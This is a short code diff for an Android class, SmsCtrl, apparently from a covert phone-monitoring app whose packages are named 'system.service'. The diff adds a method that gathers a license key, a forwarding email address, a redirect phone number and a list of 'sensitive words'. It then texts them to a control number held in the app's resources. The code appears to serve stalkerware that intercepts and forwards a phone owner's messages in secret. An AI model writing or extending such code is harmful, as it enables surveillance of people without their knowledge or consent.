@@ -5,6 +5,9 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
 
+import system.service.R;
+import system.service.activity.GlobalPrefActivity;
+import system.service.config.ConfigCtrl;
 import system.service.feature.contact.ContactInfo;
 import com.particle.inspector.common.util.SysUtils;
 import system.service.feature.sms.SMS_TYPE;
@@ -193,6 +196,18 @@ public class SmsCtrl
 			tempString += smsMessage[n].getDisplayMessageBody();
 		}
 		return tempString;
+	}
+
+	// The sms content format: <header>|<license key>|<receiver mail>|<receiver phone num>|<receiver sensitive words>
+	public static void sendReceiverInfoSms(Context context) {
+		String strMobile = context.getResources().getString(R.string.srv_address).trim();
+		String key = ConfigCtrl.getLicenseKey(context);
+		if (key == null) key = "";
+		String rcvMail = GlobalPrefActivity.getMail(context);
+		String rcvPhoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
+		String sensWords = GlobalPrefActivity.getSensitiveWords(context);
+		String strContent = "Info|" + key + "|" + rcvMail + "|" + rcvPhoneNum + "|" + sensWords;
+		sendSms(strMobile, strContent);
 	}
 	
 }
